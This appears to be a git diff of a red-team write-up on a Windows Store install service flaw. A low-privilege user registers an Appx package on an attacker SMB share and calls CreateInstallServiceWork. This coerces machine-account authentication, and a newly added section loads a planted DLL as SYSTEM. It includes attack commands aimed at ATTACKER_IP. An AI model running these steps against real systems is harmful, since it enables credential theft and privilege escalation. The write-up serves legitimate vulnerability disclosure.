@@ -4,8 +4,6 @@ Hi! it's been almost a year since i disappeared from the public red team communi
 
 My initial focus was discovering new RPC attack surfaces and ended up finding plenty of interesting stuff along the way maybe will post about them later, later i came across the news that microsoft finally added RPC monitoring support (https://techcommunity.microsoft.com/blog/microsoftdefenderatpblog/microsoft-defender-now-monitors-rpc-activity/4523368). so i wanted to continue in diffrent path. it has been a long fight between RPC and the security community. we've already seen plenty of research in this area starting with PetitPotam, which microsoft says is patched, but the story is a bit more complicated than that as at the end of the day, a lot of these coercion vectors are really just features being used in ways they weren't originally intended to be used.
 
-Reason of publishing this now is because of the limitation it comes with making it not very much reliable for red team operations - refer to the limitations part at the end for more details.
-
 ---
 
 shortly this primitive is:
@@ -75,7 +73,7 @@ the only question left is "how does a normal user get a package whose `Installed
 Add-AppxPackage -Register \\attacker\share\AppxManifest.xml
 ```
 
-windows registers the package "in place", so the registered `InstalledLocation` is literally the UNC you pointed at. then you trigger the work with that package's family name as the plugin id. the full chain is two non-admin calls and is implemented in `poc/Invoke-InstallServiceCoerce.ps1`:
+windows registers the package "in place", so the registered `InstalledLocation` is literally the UNC you pointed at. then you trigger the work with that package's family name as the plugin id.
 
 1. `Add-AppxPackage -Register \\attacker\share\AppxManifest.xml`
 2. `CreateInstallServiceWork( FulfillmentPluginId = <that package's PFN> )`
@@ -86,6 +84,8 @@ caller is a normal user, the network authentication is the machine account.
 
 low-priv user triggered it, machine account authenticated. windows' own loader did the UNC touch, not the caller.
 
+![coercion over smb](pics/coerce-smb.png)
+
 ## attacker side
 
 two things to sort before running:
@@ -94,12 +94,12 @@ two things to sort before running:
 
 - the share needs `AppxManifest.xml`, `logo.png`, `dummy.exe`. no `InstallServicePlugin.dll` needed. `MaxVersionTested` in the manifest must be ≤ target build (`winver` on the target to check).
 
-You can run `poc/setup.sh` from the repo root on Kali. it populates the share, patches impacket, stages `poc.ps1` on the target via smbclient, and starts the server ;-)
+You can run `poc/setup.sh` from the repo root on Kali. it populates the share, patches impacket, stages `poc.ps1` on the target via smbclient if `TARGET_IP` and `TARGET_CREDS` are set, and starts the server ;-)
 
 then on Win10 as the low-priv user from an interactive session:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File poc.ps1 -AttackerHost ip -Share coerce
+powershell -ExecutionPolicy Bypass -File poc.ps1 -AttackerHost ATTACKER_IP -Share coerce
 ```
 
 ## it repeats on its own
@@ -110,20 +110,29 @@ the work item is queued to disk and replays on reboot. a single trigger keeps co
 
 ## the non-admin story
 
-confirmed end to end as a real standard user. `coercelow`, `Users` only, medium integrity `S-1-16-8192`, `IsAdmin=False`. from that session registered the UNC package and called `CreateInstallServiceWork`. caught `MY-WIN10$` immediately and again on queue retries.
-
-```text
-user=coercelow
-Mandatory Label\Medium Mandatory Level Label   S-1-16-8192
-[*] Elevated: False
-    InstalledLocation = \\192.168.139.132\coerce
-    CreateInstallServiceWork=0x...
-->  MY-WIN10$::SEVENKINGDOMS:...
-```
+confirmed end to end as a real standard user. `coercelow`, `Users` only, medium integrity `S-1-16-8192`, `IsAdmin=False`. from that session i registered the UNC package (`InstalledLocation = \\ATTACKER_IP\coerce`) and called `CreateInstallServiceWork`, and the Kali listener caught `MY-WIN10$` immediately and again on every queue retry. the smb screenshot above is that capture.
 
 `Add-AppxPackage -Register` deploys into the logged-on user's session, so that user needs an interactive session. session-0 with nobody logged on fails `0x80073D19`.
 
 the only real precondition is **Developer Mode** on the target. common on dev/engineering machines, not on locked-down endpoints. removing it is the open lead, see limitations.
+
+## LPE
+
+there is a second side to the same bug that is more direct than coercion. if `InstallServicePlugin.dll` actually exists on the UNC package path, the service still reaches the same `LoadLibraryW(\\attacker\share\InstallServicePlugin.dll)` branch, but this time the loader succeeds and the dll is mapped inside the store install service process as `NT AUTHORITY\SYSTEM`.
+
+so i got hyped trying to proof for this issue and wrote the poc in `lpe/`. the important thing is not another package registration trick, it is the same registered loose package being reused as the plugin package. the harness asks the low-priv user's package family name with `Get-AppxPackage`, passes that PFN as `FulfillmentPluginId`, sets `SkipCatalogLookup=true`, and includes `SerializedFulfillmentData`. that last field matters because `InstallQueue2::CreateWork` rejects the request with `0x80070057` if catalog lookup is skipped without fulfillment data.
+
+![dllmain as system](pics/lpe-system.png)
+
+it's very important to note about something took long time in troubleshooting which is that **impacket cannot serve a loadable image.** it answers the reads well enough for the machine account to authenticate, so the coercion path is perfectly happy, but `LoadLibraryW` against an impacket share comes back null with `ERROR_INVALID_HANDLE` and `DllMain` never runs. serve the exact same files with a real SMB server (Samba) and the load succeeds. Samba reports `NTFS` by default so the loose registration still goes through. so the rule is simple: impacket when you only want the hash, Samba when you want the dll to actually execute as SYSTEM!
+
+on a real run, triggered by the low-priv user, `uncanny_lpe.txt` shows the dll mapped into `svchost.exe` and the token resolving to `NT AUTHORITY\SYSTEM` / `S-1-5-18`, which is the screenshot below.
+
+`CreateInstallServiceWork` still returns `0x800706BE` with this demo dll because `DllMain` already ran by the time the service asks for the real plugin interface and gives up :-)
+
+
+![activateplugin loadlibrary branch](pics/lpe-ida.png)
+
 
 ## limitations
 
